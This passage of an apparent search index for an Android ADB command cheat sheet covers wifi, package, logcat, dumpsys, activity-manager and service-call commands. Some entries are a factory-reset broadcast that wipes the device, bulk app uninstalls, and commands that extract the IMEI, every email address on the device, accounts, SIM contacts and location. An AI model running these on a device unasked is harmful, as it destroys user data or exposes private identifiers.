not"},{"location":"android/adb/readme/#sets-whether-imsi-protection-exemption-for-carrier-is-approved-or-not","text":"cmd -w wifi imsi-protection-exemption-set-user-approved-for-carrier <carrier id> yes|no","title":"Sets whether Imsi protection exemption for carrier is approved or not"},{"location":"android/adb/readme/#queries-whether-network-suggestions-from-the-app-is-approved-or-not","text":"cmd -w wifi network-suggestions-has-user-approved <package name>","title":"Queries whether network suggestions from the app is approved or not."},{"location":"android/adb/readme/#sets-whether-network-suggestions-from-the-app-is-approved-or-not","text":"cmd -w wifi network-suggestions-set-user-approved <package name> yes|no","title":"Sets whether network suggestions from the app is approved or not."},{"location":"android/adb/readme/#sets-whether-low-latency-mode-is-forced-or-left-for-normal-operation","text":"cmd -w wifi force-low-latency-mode enabled|disabled","title":"Sets whether low latency mode is forced or left for normal operation."},{"location":"android/adb/readme/#sets-whether-hi-perf-mode-is-forced-or-left-for-normal-operation","text":"cmd -w wifi force-hi-perf-mode enabled|disabled","title":"Sets whether hi-perf mode is forced or left for normal operation."},{"location":"android/adb/readme/#gets-current-interval-between-rssi-polls-in-milliseconds","text":"cmd -w wifi get-poll-rssi-interval-msecs","title":"Gets current interval between RSSI polls, in milliseconds."},{"location":"android/adb/readme/#sets-the-interval-between-rssi-polls-to--milliseconds","text":"cmd -w wifi set-poll-rssi-interval-msecs <int>","title":"Sets the interval between RSSI polls to  milliseconds."},{"location":"android/adb/readme/#gets-setting-of-cmd_ip_reachability_lost-events-triggering-disconnects","text":"Equivalent to receiving the TelephonyManager.ACTION_EMERGENCY_CALL_STATE_CHANGED broadcast, sets whether we are in the middle of an emergency call. cmd -w wifi set-emergency-call-state enabled|disabled","title":"Gets setting of CMD_IP_REACHABILITY_LOST events triggering disconnects."},{"location":"android/adb/readme/#equivalent-to-receiving-the-telephonymanageraction_emergency_callback_mode_changed-broadcast","text":"cmd -w wifi set-emergency-callback-mode enabled|disabled","title":"Equivalent to receiving the TelephonyManager.ACTION_EMERGENCY_CALLBACK_MODE_CHANGED broadcast."},{"location":"android/adb/readme/#lists-the-suggested-networks-from-the-app_1","text":"cmd -w wifi list-suggestions-from-app <package name>","title":"Lists the suggested networks from the app"},{"location":"android/adb/readme/#lists-all-suggested-networks-on-this-device_1","text":"cmd -w wifi list-all-suggestions","title":"Lists all suggested networks on this device"},{"location":"android/adb/readme/#notice-this-only-returns-whether-the-app-was-set-via-the-network-requests-set-user-approved-shell-command","text":"Queries whether network requests from the app is approved or not cmd -w wifi network-requests-has-user-approved <package name>","title":"Notice: This only returns whether the app was set via the 'network-requests-set-user-approved' shell command"},{"location":"android/adb/readme/#note-only-1-such-app-can-be-approved-from-the-shell-at-a-time_1","text":"Sets whether network requests from the app is approved or not. cmd -w wifi network-requests-set-user-approved <package name> yes|no","title":"Note: Only 1 such app can be approved from the shell at a time"},{"location":"android/adb/readme/#lists-the-requested-networks-added-via-shell_1","text":"cmd -w wifi list-requests","title":"Lists the requested networks added via shell"},{"location":"android/adb/readme/#removes-all-active-requests-added-via-shell_1","text":"cmd -w wifi remove-all-requests","title":"Removes all active requests added via shell"},{"location":"android/adb/readme/#remove-a-network-request-with-provided-ssid-of-the-network_1","text":"cmd -w wifi remove-request <ssid>","title":"Remove a network request with provided SSID of the network"},{"location":"android/adb/readme/#add-a-network-request-with-provided-params_1","text":"cmd -w wifi add-request <ssid> open|owe|wpa2|wpa3 [<passphrase>] [-b <bssid>]","title":"Add a network request with provided params"},{"location":"android/adb/readme/#initiates-wifi-settings-reset_1","text":"cmd -w wifi settings-reset","title":"Initiates wifi settings reset"},{"location":"android/adb/readme/#andor-wifi_softap_wpa3_sae_supported-each-on-a-separate-line","text":"cmd -w wifi get-softap-supported-features","title":"and/or 'wifi_softap_wpa3_sae_supported', each on a separate line."},{"location":"android/adb/readme/#gets-setting-of-wifi-watchdog-trigger-recovery_1","text":"cmd -w wifi get-wifi-watchdog","title":"Gets setting of wifi watchdog trigger recovery."},{"location":"android/adb/readme/#sets-whether-wifi-watchdog-should-trigger-recovery_1","text":"cmd -w wifi set-wifi-watchdog enabled|disabled","title":"Sets whether wifi watchdog should trigger recovery"},{"location":"android/adb/readme/#sets-country-code-to--or-left-for-normal-value_1","text":"cmd -w wifi force-country-code enabled <two-letter code> | disabled","title":"Sets country code to  or left for normal value"},{"location":"android/adb/readme/#sets-whether-soft-ap-channel-is-forced-to--mhz","text":"cmd -w wifi force-softap-channel enabled <int> | disabled","title":"Sets whether soft AP channel is forced to  MHz"},{"location":"android/adb/readme/#manually-triggers-a-link-probe_1","text":"cmd -w wifi send-link-probe","title":"Manually triggers a link probe."},{"location":"android/adb/readme/#clears-the-user-disabled-networks-list_1","text":"cmd -w wifi clear-user-disabled-networks","title":"Clears the user disabled networks list."},{"location":"android/adb/readme/#removes-all-user-approved-network-requests-for-the-app_1","text":"cmd -w wifi network-requests-remove-user-approved-access-points <package name>","title":"Removes all user approved network requests for the app."},{"location":"android/adb/readme/#clear-the-user-choice-on-imsi-protection-exemption-for-carrier_1","text":"cmd -w wifi imsi-protection-exemption-clear-user-approved-for-carrier <carrier id>","title":"Clear the user choice on Imsi protection exemption for carrier"},{"location":"android/adb/readme/#queries-whether-imsi-protection-exemption-for-carrier-is-approved-or-not_1","text":"cmd -w wifi imsi-protection-exemption-has-user-approved-for-carrier <carrier id>","title":"Queries whether Imsi protection exemption for carrier is approved or not"},{"location":"android/adb/readme/#sets-whether-imsi-protection-exemption-for-carrier-is-approved-or-not_1","text":"cmd -w wifi imsi-protection-exemption-set-user-approved-for-carrier <carrier id> yes|no","title":"Sets whether Imsi protection exemption for carrier is approved or not"},{"location":"android/adb/readme/#list-uid-owner-of-a-app","text":"cmd package list packages -U####","title":"List uid owner of a app"},{"location":"android/adb/readme/#list-packages-aka-pm-list-packages","text":"cmd package list packages -l","title":"List packages a.k.a: pm list packages"},{"location":"android/adb/readme/#list-disabled-packages","text":"cmd package list packages -d","title":"List disabled packages"},{"location":"android/adb/readme/#filter-to-only-show-enabled-packages","text":"cmd package list packages -e","title":"Filter to only show enabled packages"},{"location":"android/adb/readme/#filter-to-only-show-third-party-packages","text":"cmd package list packages -3","title":"Filter to only show third party packages"},{"location":"android/adb/readme/#set-the-default-home-activity-aka-launcher","text":"cmd package set-home-activity [--user USER_ID] TARGET-COMPONENT","title":"Set the default home activity (aka launcher)"},{"location":"android/adb/readme/#prints-all-features-of-the-system","text":"cmd package list features","title":"Prints all features of the system"},{"location":"android/adb/readme/#print-briefs","text":"cmd package resolve-activity --brief com.facebook.katana priority=0 preferredOrder=0 match=0x108000 specificIndex=-1 isDefault=false com.facebook.katana/.LoginActivity","title":"Print briefs"},{"location":"android/adb/readme/#adb-pm","text":"","title":"ADB pm"},{"location":"android/adb/readme/#print-all-applications-in-use","text":"pm list packages | sed -e \"s/package://\" | while read x ; do cmd package resolve-activity --brief $x \\ | tail -n 1 \\ | grep -v \"No activity found\" done","title":"Print all applications in use"},{"location":"android/adb/readme/#list-all-packages-installed-on-device","text":"pm list packages","title":"List all packages installed on device"},{"location":"android/adb/readme/#list-enabled-packages","text":"pm list packages -e","title":"List enabled packages"},{"location":"android/adb/readme/#list-disabled-packages_1","text":"pm list packages -d","title":"List disabled packages"},{"location":"android/adb/readme/#list-third-party-packages-installed-by-user","text":"pm list packages -3","title":"List third party packages installed by user"},{"location":"android/adb/readme/#list-users","text":"pm list users","title":"List users"},{"location":"android/adb/readme/#list-permission-groups","text":"pm list permission-groups","title":"List permission groups"},{"location":"android/adb/readme/#list-features","text":"pm list features","title":"List features"},{"location":"android/adb/readme/#uninstall-any-installed-package","text":"pm uninstall --user 0 com.package.name","title":"Uninstall any installed package:"},{"location":"android/adb/readme/#uninstall-multiple-apps","text":"for packages in com.package1 com.package2 ; do adb shell pm uninstall --user 0 \" ${ packages } \" done","title":"Uninstall multiple apps:"},{"location":"android/adb/readme/#clear-application-data","text":"pm clear PACKAGE_NAME","title":"Clear application data:"},{"location":"android/adb/readme/#list-permission-groups_1","text":"pm list permission-groups","title":"List permission groups:"},{"location":"android/adb/readme/#list-instrumentation","text":"pm list instrumentation","title":"List instrumentation:"},{"location":"android/adb/readme/#grant-permission-to-an-app-example-only-for-grant","text":"pm grant com.application android.permission.READ_LOGS","title":"Grant permission to an app (Example Only For Grant):"},{"location":"android/adb/readme/#revoke-permission-to-an-app-example-only-for-revoke","text":"pm revoke com.application android.permission.READ_LOGS","title":"Revoke permission to an app (Example Only For Revoke):"},{"location":"android/adb/readme/#reset-all-permissions-for-an-app","text":"pm reset-permissions -p your.app.package","title":"Reset all permissions for an app:"},{"location":"android/adb/readme/#adb-logcat","text":"","title":"ADB logcat"},{"location":"android/adb/readme/#default-options","text":"Example Output * V \u2014 Verbose (lowest priority) * D \u2014 Debug * I \u2014 Info (default priority) * W \u2014 Warning * E \u2014 Error * F \u2014 Fatal * S \u2014 Silent (highest priority, on which nothing is ever printed)","title":"Default options:"},{"location":"android/adb/readme/#use--v-time-for-print-timestamps-and-threadtime-for-dates","text":"adb logcat -v time ... adb logcat -v threadtime ....","title":"Use -v time for print timestamps, and threadtime for dates:"},{"location":"android/adb/readme/#for-get-example-output-colorized-with-logcat","text":"adb logcat ... -v color","title":"For get Example Output colorized with logcat:"},{"location":"android/adb/readme/#displays-current-log-buffer-sizes","text":"adb logcat -g","title":"Displays current log buffer sizes:"},{"location":"android/adb/readme/#sets-the-buffer-size-k-or-m","text":"adb logcat -G 16M","title":"Sets the buffer size (K or M):"},{"location":"android/adb/readme/#clear-the-log-buffer","text":"adb logcat -c","title":"Clear the log buffer:"},{"location":"android/adb/readme/#enables-all-log-messages-verbose-mode","text":"adb logcat *:V","title":"Enables ALL log messages (verbose mode)"},{"location":"android/adb/readme/#dump-everything-to-a-file","text":"adb logcat -f <filename> Dumps to specified file","title":"Dump everything to a file:"},{"location":"android/adb/readme/#display-pid-with-the-log-info","text":"adb logcat -v process","title":"Display PID with the log info"},{"location":"android/adb/readme/#display-the-raw-log-message-with-no-other-metadata-fields","text":"adb logcat -v raw","title":"Display the raw log message, with no other metadata fields"},{"location":"android/adb/readme/#display-the-date-invocation-time-prioritytag-and-pid-of-the-process-issuing-the-message","text":"adb logcat -v time","title":"Display the date, invocation time, priority/tag, and PID of the process issuing the message"},{"location":"android/adb/readme/#display-the-priority-tag-and-the-pid-and-tid-of-the-thread-issuing-the-message","text":"adb logcat -v thread","title":"Display the priority, tag, and the PID and TID of the thread issuing the message"},{"location":"android/adb/readme/#display-the-date-invocation-time-priority-tag-and-the-pid-and-tid-of-the-thread-issuing-the-message","text":"adb logcat -v threadtime","title":"Display the date, invocation time, priority, tag, and the PID and TID of the thread issuing the message"},{"location":"android/adb/readme/#display-all-metadata-fields-and-separate-messages-with-blank-lines","text":"adb logcat -v long","title":"Display all metadata fields and separate messages with blank lines"},{"location":"android/adb/readme/#log-multiple-options--b---b-","text":"adb logcat -b main -b radio -b events","title":"Log multiple options (-b ... -b ....):"},{"location":"android/adb/readme/#run-all-at-once-no-reason-for-use-it-like-this-really","text":"adb logcat -v brief -v long -v process -v raw -v tag -v thread -v threadtime -v time -v color","title":"Run all at once, no reason for use it like this really"},{"location":"android/adb/readme/#adb-dumpsys","text":"","title":"ADB dumpsys"},{"location":"android/adb/readme/#list-all-active-services","text":"dumpsys -l List services on older devices via command below dumpsys -l | sed 's/^ / /g' Example Output Currently running services: AAS AODManagerService CCM CocktailBarService CodecSolution CustomFrequencyManagerService DeviceRootKeyService DirEncryptService DisplaySolution DockObserver EngineeringModeService HqmManagerService ImsBase OcfKeyService ReactiveService SEAMService SamsungKeyProvisioningManagerService SatsService SecExternalDisplayService","title":"List all active services:"},{"location":"android/adb/readme/#dumpsys-lock_settings","text":"dumpsys lock_settings Example Output Current lock settings service state: User State: User 0 SP Handle: 5f0ef3437a85f55 Last changed: 2021-07-28 20:22:36 (b8212446331f2358) SID: 3fffcda35ee6c180 Quality: 0 CredentialType: Pin SeparateChallenge: true Metrics: known Storage: User 0 [/data/system_de/0/spblob]: 5 2021-07-28 20:22:36 05f0ef3437a85f55.weaver 31 2021-07-28 20:22:36 05f0ef3437a85f55.pwd 72 2021-07-28 20:22:36 05f0ef3437a85f55.metrics 186 2021-07-28 20:22:36 05f0ef3437a85f55.spblob 58 2021-07-28 20:22:36 0000000000000000.handle StrongAuth: PrimaryAuthFlags state: userId = 0, primaryAuthFlags=0 NonStrongBiometricAllowed state: RebootEscrow: mRebootEscrowWanted = false mRebootEscrowReady = false mRebootEscrowListener = com.android.server.recoverysystem.RecoverySystemService@bc1c4d8 mPendingRebootEscrowKey is not set","title":"Dumpsys lock_settings"},{"location":"android/adb/readme/#print-codecs-for-bluetooth-headphones","text":"dumpsys media.audio_flinger | grep -A3 Input","title":"Print codecs for bluetooth headphones"},{"location":"android/adb/readme/#show-bluetooth-macaddr-bluetooth-name-and-such-things","text":"dumpsys bluetooth_manager","title":"Show bluetooth macaddr, bluetooth name and such things"},{"location":"android/adb/readme/#dump-phone-registry","text":"dumpsys telephony.registry","title":"Dump phone registry"},{"location":"android/adb/readme/#dump-gps-data","text":"dumpsys location","title":"Dump GPS Data:"},{"location":"android/adb/readme/#dump-settings","text":"adb shell dumpsys settings Example Output _id:225 name:lock_screen_show_notifications pkg:com.android.settings value:1 _id:6 name:volume_bluetooth_sco pkg:android value:7 default:7 _id:192 name:ringtone_set pkg:com.google.android.gsf value:1 _id:159 name:lock_screen_allow_rotation pkg:android value:0 _id:2997 name:Flashlight_brightness_level pkg:com.android.systemui value:1001 _id:67 name:SEM_VIBRATION_NOTIFICATION_INTENSITY pkg:android value:5 _id:175 name:call_popup pkg:android value:0 default:0 _id:59 name:install_non_market_apps pkg:android value:1 default:1","title":"Dump Settings"},{"location":"android/adb/readme/#display-contacts-on-sim-card","text":"adb shell dumpsys simphonebook","title":"Display Contacts On Sim Card"},{"location":"android/adb/readme/#show-hardware-info-as-thermal-stuff-for-cpu-gpu-and-battery","text":"adb shell dumpsys hardware_properties Example Output ****** Dump of HardwarePropertiesManagerService ****** CPU temperatures: [38.0, 38.0] CPU throttling temperatures: [55.0, 76.0] CPU shutdown temperatures: [115.0, 115.0]","title":"Show hardware info as thermal stuff for cpu, gpu and battery"},{"location":"android/adb/readme/#show-all-application-you-have-an-account-on","text":"dumpsys account | grep -i com.*$ -o | cut -d ' ' -f1 | cut -d } -f1 | grep -v com$ Example Output com.microsoft.workaccount com.skype.raider com.samsung.android.mobileservice com.facebook.messenger com.google.android.gm.exchange","title":"Show all application you have an account on:"},{"location":"android/adb/readme/#show-all-notifications-listener-and-so-on","text":"dumpsys notification","title":"Show all notifications listener and so on:"},{"location":"android/adb/readme/#list-email-addresses-registerd-on-different-stuff-on-device","text":"dumpsys | grep -E -o \"\\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\\.[A-Za-z]{2,6}\\b\"","title":"List email addresses registerd on different stuff on device:"},{"location":"android/adb/readme/#print-version-of-a-specifik-package","text":"dumpsys package com.lge.signboard | grep versionName versionName=6.00.170603-0","title":"Print version of a specifik package"},{"location":"android/adb/readme/#check-state-for-screen-and-figoure-how-device-was-unlcked-last-time","text":"adb shell dumpsys user Example Output State: RUNNING_UNLOCKED Last logged in fingerprint agree Knox Privacy Policy: false","title":"Check state for screen and figoure how device was unlcked last time:"},{"location":"android/adb/readme/#and-for-example-you-can-dump-data-for-all-of-the-running-services-dump-all-data-for-battery","text":"adb shell dumpsys battery","title":"And for example, you can dump data for all of the running services, dump all data for battery:"},{"location":"android/adb/readme/#dump-stats-for-your-battery","text":"adb shell dumpsys batterystats","title":"Dump stats for your battery:"},{"location":"android/adb/readme/#erase-old-stats-for-battery","text":"dumpsys batterystats --reset","title":"Erase old stats for battery:"},{"location":"android/adb/readme/#sort-applications-by-ram-usage","text":"dumpsys meminfo Example Output Applications Memory Usage (in Kilobytes): Uptime: 29602806 Realtime: 57806941 Total PSS by process: 265,435K: com.android.systemui (pid 4190) 264,671K: system (pid 3838) 171,192K: surfaceflinger (pid 3360) 152,523K: android.hardware.graphics.composer@2.1-service (pid 3338) 128,781K: com.sec.android.app.launcher (pid 5597 / activities) 92,656K: se.kronansapotek.kronan (pid 26729 / activities) 84,563K: logd (pid 3203) 80,944K: com.google.android.talk (pid 32314 / activities) 79,754K: com.google.android.googlequicksearchbox:search","title":"Sort Applications By Ram Usage:"},{"location":"android/adb/readme/#unplug-ac","text":"dumpsys battery unplug","title":"Unplug AC:"},{"location":"android/adb/readme/#see-current-used-app","text":"dumpsys window windows | grep -E 'mCurrentFocus|mFocusedApp'|grep '/'|awk -F'u0' '{print $2}'|awk '{print $1}'","title":"See current used app:"},{"location":"android/adb/readme/#print-how-many-notifications-you-have","text":"dumpsys notification | grep NotificationRecord | wc -l","title":"Print how many notifications you have:"},{"location":"android/adb/readme/#adb-dumpstate","text":"","title":"ADB dumpstate"},{"location":"android/adb/readme/#dump-info-about-your-sim-provider-and-kernel-bootloader-id-etc","text":"dumpstate -v Example Output = ======================================================= = = dumpstate: 2019-08-30 19:31:05 = ======================================================= Build: PPR1.180610.011.G950FXXS5DSF1 Build fingerprint: 'samsung/dreamltexx/dreamlte:9/PPR1.180610.011/G950FXXS5DSF1:user/release-keys' Bootloader: G950FXXS5DSF1 Radio: G950FXXS5DSF1 Network: Comviq Linux version 4.4.111-16019454 (dpi@21DHA724) (gcc version 4.9.x 20150123 (prerelease) (GCC) ) #1 SMP PREEMPT Mon Jun 3 20:16:50 KST 2019 Kernel: Command line: (unknown) up 0 weeks, 0 days, 16 hours, 21 minutes Uptime: Bugreport format version: 2.0 Dumpstate info: id = 0 pid=26940 dry_run=0 args=dumpstate -v extra_options=","title":"Dump info about your sim provider and kernel bootloader ID etc."},{"location":"android/adb/readme/#adb-am","text":"","title":"ADB am"},{"location":"android/adb/readme/#how-to-use-demo-mode","text":"","title":"How to use Demo Mode"},{"location":"android/adb/readme/#first-you-enable-the-demo-mode","text":"settings put global sysui_demo_allowed 1","title":"First you enable the Demo Mode:"},{"location":"android/adb/readme/#display-time-1200","text":"am broadcast -a com.android.systemui.demo -e command clock -e hhmm 1200","title":"Display time 12:00"},{"location":"android/adb/readme/#display-full-mobile-data-without-type","text":"am broadcast -a com.android.systemui.demo -e command network -e mobile show -e level 4 -e datatype false","title":"Display full mobile data without type"},{"location":"android/adb/readme/#hide-notifications","text":"am broadcast -a com.android.systemui.demo -e command notifications -e visible false","title":"Hide notifications"},{"location":"android/adb/readme/#show-full-battery-but-not-in-charging-state","text":"am broadcast -a com.android.systemui.demo -e command battery -e plugged false -e level 100","title":"Show full battery but not in charging state"},{"location":"android/adb/readme/#exit-demo-mode","text":"am broadcast -a com.android.systemui.demo -e command exit","title":"Exit Demo Mode"},{"location":"android/adb/readme/#add-a-value-to-default-shared-preferences","text":"adb shell 'am broadcast -a org.example.app.sp.PUT --es key key_name --es value \"hello world!\"'","title":"Add a value to default shared preferences."},{"location":"android/adb/readme/#remove-a-value-to-default-shared-preferences","text":"adb shell 'am broadcast -a org.example.app.sp.REMOVE --es key key_name'","title":"Remove a value to default shared preferences."},{"location":"android/adb/readme/#clear-all-default-shared-preferences","text":"adb shell 'am broadcast -a org.example.app.sp.CLEAR --es key key_name'","title":"Clear all default shared preferences."},{"location":"android/adb/readme/#its-also-possible-to-specify-shared-preferences-file","text":"adb shell 'am broadcast -a org.example.app.sp.PUT --es name Game --es key level --ei value 10'","title":"It's also possible to specify shared preferences file."},{"location":"android/adb/readme/#play-a-mp3-track-on-device","text":"am start -a android.intent.action.VIEW -d file:////storage/9A8A-1069/wuseman/ringtones/<mp3_track>.mp3 -t audio/mp3","title":"Play a mp3 track on device"},{"location":"android/adb/readme/#data-types","text":"adb shell 'am broadcast -a org.example.app.sp.PUT --es key string --es value \"hello world!\"' adb shell 'am broadcast -a org.example.app.sp.PUT --es key boolean --ez value true' adb shell 'am broadcast -a org.example.app.sp.PUT --es key float --ef value 3.14159' adb shell 'am broadcast -a org.example.app.sp.PUT --es key int --ei value 2015' adb shell 'am broadcast -a org.example.app.sp.PUT --es key long --el value 9223372036854775807'","title":"Data types"},{"location":"android/adb/readme/#restart-application-process-after-making-changes","text":"adb shell 'am broadcast -a org.example.app.sp.CLEAR --ez restart true'","title":"Restart application process after making changes"},{"location":"android/adb/readme/#open-google-camera-pixel-4","text":"am start com.google.android.GoogleCamera","title":"Open Google Camera (Pixel 4)"},{"location":"android/adb/readme/#set-default-preferences-for-an-app","text":"am broadcast -a org.example.app.sp.CLEAR --es key key_name","title":"Set default preferences for an app:"},{"location":"android/adb/readme/#warning-factory-reset","text":"am broadcast -a android.intent.action.MASTER_CLEAR","title":"WARNING!! Factory Reset"},{"location":"android/adb/readme/#open-special-menu","text":"am start -a android.intent.action.VIEW \\","title":"Open Special Menu"},{"location":"android/adb/readme/#open-settings","text":"am start -n com.android.settings/com.android.settings.Settings","title":"Open settings:"},{"location":"android/adb/readme/#open-activity-to-new-apn","text":"am start -a android.intent.action.INSERT content://telephony/carriers --ei simId","title":"Open activity to new APN"},{"location":"android/adb/readme/#open-hiden-menu-require-root","text":"su -c \"am broadcast -a android.provider.Telephony.SECRET_CODE -d android_secret_code://IOTHIDDENMENU\"","title":"Open hiden menu (require root)"},{"location":"android/adb/readme/#start-prefered-webbrowser","text":"am start -a android.intent.action.VIEW -d <url> (com.android.browser | com.android.chrome | com.sec.android.sbrowser)","title":"Start prefered webbrowser:"},{"location":"android/adb/readme/#print-activities","text":"am start -a com.android.settings/.wifi.CaptivePortalWebViewActivity","title":"Print Activities:"},{"location":"android/adb/readme/#open-camera-in-photo-mode","text":"am start -a android.media.action.IMAGE_CAPTURE","title":"Open Camera in Photo mode"},{"location":"android/adb/readme/#open-camera-in-photo-mode-and-take-a-picture","text":"am start -a android.media.action.IMAGE_CAPTURE input keyevent 66","title":"Open Camera in Photo mode and take a picture"},{"location":"android/adb/readme/#open-camera-in-video-mode","text":"am start -a android.media.action.VIDEO_CAMERA","title":"Open Camera in Video mode"},{"location":"android/adb/readme/#open-camera-in-video-mode-and-start-recording","text":"am start -a android.media.action.VIDEO_CAMERA input keyevent 66","title":"Open Camera in Video mode and start recording"},{"location":"android/adb/readme/#go-to-gallary-and-choose-a-picture-and-then-set-wallpaper","text":"am start -a android.intent.action.SET_WALLPAPER","title":"Go to gallary and choose a picture and then set wallpaper:"},{"location":"android/adb/readme/#open-any-url-in-default-browser","text":"am start -a android.intent.action.VIEW -d https://github.com/wuseman","title":"Open any URL in default browser"},{"location":"android/adb/readme/#open-google-maps-with-fixed-coordinates","text":"am start -a android.intent.action.VIEW -d \"geo:46.457398,-119.407305\"","title":"Open Google Maps with fixed coordinates"},{"location":"android/adb/readme/#simulate-waking-your-app-using-the-following-commands","text":"am set-inactive <packageName> am set-inactive <packageName> false","title":"Simulate waking your app using the following commands"},{"location":"android/adb/readme/#enabling-night-mode-if-supported","text":"am start --ez show_night_mode true com.android.systemui/.tuner.TunerActivity","title":"Enabling Night Mode (If Supported)"},{"location":"android/adb/readme/#start-facebook-application-inbox-by-using-uri","text":"am start -a android.intent.action.VIEW -d facebook://facebook.com/inbox","title":"Start facebook application inbox by using URI"},{"location":"android/adb/readme/#open-a-vcard-file-from-sdcard-will-open-contacts-app","text":"am start -a android.intent.action.VIEW -d file:///sdcard/me.vcard -t text/x-vcard","title":"Open a vcard file from sdcard (will open contacts app)"},{"location":"android/adb/readme/#open-an-application-to-get-content-in-this-case-to-get-a-jpeg-picture","text":"am start -a android.intent.action.GET_CONTENT -t image/jpeg","title":"Open an application to get content (in this case to get a jpeg picture)"},{"location":"android/adb/readme/#there-is-several-ways-to-send-a-sms-via-am-here-is-just-one-of-several-ways","text":"am broadcast -a com.whereismywifeserver.intent.TEST --es sms_body \"test from adb\" #### Simulate waking your app using the following commands: am set-inactive <packageName> am set-inactive <packageName> false","title":"There is several ways to send a SMS via AM, here is just one of several ways:"},{"location":"android/adb/readme/#start-facebook-application-inbox-by-using-uri_1","text":"am start -a android.intent.action.VIEW -d facebook://facebook.com/inbox","title":"Start facebook application inbox by using URI"},{"location":"android/adb/readme/#open-a-vcard-file-from-sdcard-will-open-contacts-app_1","text":"am start -a android.intent.action.VIEW -d file:///sdcard/me.vcard -t text/x-vcard","title":"Open a vcard file from sdcard (will open contacts app)"},{"location":"android/adb/readme/#open-an-application-to-get-content-in-this-case-to-get-a-jpeg-picture_1","text":"am start -a android.intent.action.GET_CONTENT -t image/jpeg","title":"Open an application to get content (in this case to get a jpeg picture)"},{"location":"android/adb/readme/#there-is-several-ways-to-send-a-sms-via-am-here-is-one-example","text":"am broadcast -a com.whereismywifeserver.intent.TEST --es sms_body \"test from adb\"","title":"There is several ways to send a SMS via AM, here is one example:"},{"location":"android/adb/readme/#open-settings-for-a-specifik-app","text":"am start -a android.settings.APPLICATION_DETAILS_SETTINGS package:<com.package.example>","title":"Open settings for a specifik app"},{"location":"android/adb/readme/#add-contacts","text":"Add a Contact - Example 1 am start -a android.intent.action.INSERT -t vnd.android.cursor.dir/contact -e name \"$(dialog --stdout --inputbox 'wuseman' 0 0)\" -e postal \"$(dialog --stdout --inputbox 'Postal Address' 0 0)\" -e phone \"$(dialog --stdout --inputbox 'Phone Number' 0 0)\" -e email \"$(dialog --stdout --inputbox 'Email' 0 0)\" Add a Contact - Example 2 am start -a android.intent.action.INSERT -t vnd.android.cursor.dir/contact -e name 'wuseman' -e phone <phone_number>","title":"Add Contacts"},{"location":"android/adb/readme/#open-projectmenu-huawei-only","text":"am start com.huawei.android.projectmenu/com.huawei.android.projectmenu.ProjectMenuActivity","title":"Open Projectmenu (Huawei only)"},{"location":"android/adb/readme/#make-demo-call","text":"Establishes a fake Bluetooth connection to Dialer and must be called first to enable access to all call-related commands.","title":"Make Demo Call"},{"location":"android/adb/readme/#to-connect-a-device","text":"adb shell am broadcast -a com.android.car.dialer.intent.action.adb --es \"action\" \"connect\"","title":"To connect a device"},{"location":"android/adb/readme/#place-an-outgoing-call","text":"adb shell am broadcast -a com.android.car.dialer.intent.action.adb --es \"action\" \"addCall\" --es \"id\" \"4085524874\"","title":"Place an outgoing call"},{"location":"android/adb/readme/#receive-an-incoming-call","text":"adb shell am broadcast -a com.android.car.dialer.intent.action.adb --es \"action\" \"rcvCall\" --es \"id\" \"4085524874\"","title":"Receive an incoming call"},{"location":"android/adb/readme/#end-a-call","text":"adb shell am broadcast -a com.android.car.dialer.intent.action.adb --es \"action\" \"endCall\" --es \"id\" \"4085524874\"","title":"End a call"},{"location":"android/adb/readme/#hold-the-current-call","text":"adb shell am broadcast -a com.android.car.dialer.intent.action.adb --es \"action\" \"holdCall\"","title":"Hold the current call"},{"location":"android/adb/readme/#unhold-the-current-call","text":"adb shell am broadcast -a com.android.car.dialer.intent.action.adb --es \"action\" \"unholdCall\"","title":"Unhold the current call"},{"location":"android/adb/readme/#merge-calls","text":"adb shell am broadcast -a com.android.car.dialer.intent.action.adb --es \"action\" \"unholdCall\"","title":"Merge calls"},{"location":"android/adb/readme/#clear-all-calls-to-remove-all-calls-in-the-call-list","text":"adb shell am broadcast -a com.android.car.dialer.intent.action.adb --es \"action\" \"clearAll\"","title":"Clear all calls, To remove all calls in the call list:"},{"location":"android/adb/readme/#adb-acpi","text":"","title":"ADB acpi"},{"location":"android/adb/readme/#get-battery-percentage","text":"acpi","title":"Get Battery Percentage"},{"location":"android/adb/readme/#show-batteries","text":"acpi -b","title":"Show batteries"},{"location":"android/adb/readme/#show-cooling-device-state","text":"acpi -c","title":"Show Cooling Device State"},{"location":"android/adb/readme/#show-temperatures","text":"acpi -t","title":"Show Temperatures"},{"location":"android/adb/readme/#just-print-everything-from-acpi","text":"acpi -V","title":"Just print everything from acpi"},{"location":"android/adb/readme/#adb-dpm","text":"","title":"ADB dpm"},{"location":"android/adb/readme/#enable-device-admin","text":"dpm set-device-owner com.package.name/.DeviceAdminReceiver","title":"Enable Device Admin"},{"location":"android/adb/readme/#adb-service","text":"","title":"ADB service"},{"location":"android/adb/readme/#statusbar","text":"","title":"StatusBar"},{"location":"android/adb/readme/#expand-status-bar_1","text":"service call statusbar 1","title":"Expand Status Bar"},{"location":"android/adb/readme/#expand-status-bar_2","text":"service call statusbar 2","title":"Expand Status Bar "},{"location":"android/adb/readme/#collapse-status-bar_1","text":"service call statusbar 2","title":"Collapse Status Bar"},{"location":"android/adb/readme/#imei-related","text":"","title":"IMEI Related"},{"location":"android/adb/readme/#slot-1","text":"","title":"Slot 1"},{"location":"android/adb/readme/#print-imei---example-1","text":"service call iphonesubinfo 1| cut -d \"'\" -f2| grep -Eo '[0-9]'| xargs| sed 's/\\ //g'","title":"Print IMEI - Example 1"},{"location":"android/adb/readme/#print-imei---example-2","text":"service call iphonesubinfo 3 i32 1 | grep -oE '[0-9a-f]{8} ' | while read hex; do echo -ne \"\\u${hex:4:4}\\u${hex:0:4}\"; done; echo","title":"Print IMEI - Example 2"},{"location":"android/adb/readme/#print-imei---example-3","text":"echo \"[device.imei]: [$(adb shell service call iphonesubinfo 1 | awk -F \"'\" '{print $2}' | sed '1 d'| tr -d '\\n' | tr -d '.' | tr -d ' ')]\"","title":"Print IMEI - Example 3"},{"location":"android/adb/readme/#print-imei---example-4","text":"adb shell service call iphonesubinfo 1 | awk -F\"'\" 'NR>1 { gsub(/\\./,\"\",$2); imei=imei $2 } END {print imei}'","title":"Print IMEI - Example 4"},{"location":"android/adb/readme/#print-imei---example-5","text":"adb shell \"service call iphonesubinfo 1 | cut -c 52-66 | tr -d '.[:space:]'\"","title":"Print IMEI - Example 5"},{"location":"android/adb/readme/#print-imei---example-6","text":"adb shell service call iphonesubinfo 1 | awk -F \"'\" '{print }' | sed '1 d' | tr -d '.' | awk '{print}' ORS=","title":"Print IMEI - Example 